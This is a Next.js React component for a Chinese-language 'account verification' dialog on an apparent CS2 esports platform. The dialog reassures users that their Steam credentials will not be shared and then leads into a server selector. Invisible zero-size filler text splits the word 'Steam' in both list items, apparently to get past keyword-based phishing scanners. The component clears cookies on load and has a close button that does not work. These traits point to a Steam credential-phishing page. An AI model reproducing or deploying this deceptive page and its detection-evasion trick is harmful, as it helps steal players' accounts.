"use client"
import { Card } from "@/components/ui/card";
import SelectServer from "@/components/selectServer/selectServer";
import Image from "next/image";
import logo from "../../../public/img/text.png";
import { useEffect, useContext } from "react";
import { deleteCookies } from "@/actions/deleteCookies";
import { ModalContext } from "../../../context/modal.context";


const CheckDialog = ({servers}) => {

  const { isModalOpen, showModal, hideModal } = useContext(ModalContext)

  useEffect(() => {
    deleteCookies()
  },[]);  
  return (
    <Card className="fixed inset-0 flex items-center justify-center z-10 bg-transparent border-none ">
      <div
        className="fixed inset-0 bg-black opacity-50 cursor-pointer"
        style={{
          position: 'absolute',
          width: '100vw',
          height: '200vh',
          left: '0',
          top: '-100%',
        }}
        scroll={false}
      ></div>
      <div className="relative w-full max-w-[900px] px-32 bg-background rounded-md shadow-md">
        <div className="flex justify-between items-start">
          <Image
            className="absolute top-2.5 left-2.5 h-8 w-auto"
            src={logo}
            alt="cs:go专业赛事对战平台"
          />
          <div
            className="absolute top-2.5 right-2.5 h-8 w-8 text-background rounded justify-center items-center flex pb-0.5 text-white text-xl cursor-pointer"
            onClick={() => hideModal}
            scroll={false}
          >
            &times;
          </div>
        </div>
        <div className=" rounded-lg  mx-auto px-[40px] py-[80px] overflow-auto z-20">
          <div className="flex gap-[30px] mx-auto mb-[40px]">
            <svg
              className="w-[32px] h-[32px] min-w-[32px] min-h-[32px]"
              viewBox="0 0 24 24"
            >
              <path
                d="M20.12 5.12l-3.53-3.53A2 2 0 0 0 15.17 1H8.83a2 2 0 0 0-1.42.59L3.88 5.12A3 3 0 0 0 3 7.24v5.85a8 8 0 0 0 3.09 6.31l4.08 3.18a2 2 0 0 0 1.23.42h1.2a2 2 0 0 0 1.23-.42l4.08-3.18A8 8 0 0 0 21 13.09V7.24a3 3 0 0 0-.88-2.12zm-1.12 8a5.93 5.93 0 0 1-2.32 4.73L12.6 21h-1.2l-4.08-3.18A5.93 5.93 0 0 1 5 13.09V7.24a1 1 0 0 1 .29-.7L8.83 3h6.34l3.54 3.54a1 1 0 0 1 .29.7v5.88zM15.82 8a.5.5 0 0 0-.7 0l-4.74 4.74-1.5-1.49a.48.48 0 0 0-.7 0l-.53.53a.5.5 0 0 0 0 .71L10 14.85a.48.48 0 0 0 .7 0l5.62-5.62a.5.5 0 0 0 0-.71l-.5-.52z"
                fill="white"
              ></path>
            </svg>
            <div className="text-white text-left text-sm">
              <h3 className="text-lg mb-[10px]">安全连接</h3>
              <ul className="list-disc">
                <li className="mb-[20px]">
                  您的 St
                  <span className="text-[0px] text-white">
                    Playful dolphins dance beneath the moon.
                  </span>
                  eam 登录凭据不会被共享。
                </li>
                <li className="mb-[20px] text-white">
                  竞技平台 可以访问您的 St
                  <span className="text-[0px] text-white">
                    Playful dolphins dance beneath the moon.
                  </span>
                  eam 个人资料页面上设置为公开可见的任何信息。
                </li>
              </ul>
            </div>
          </div>
          <span className="block text-center mb-[32px] text-[16px] text-white">
            验证您的帐户以开始玩CS2
          </span>
          <SelectServer servers={servers} />
        </div>
      </div>
    </Card>
  );
};

export default CheckDialog;
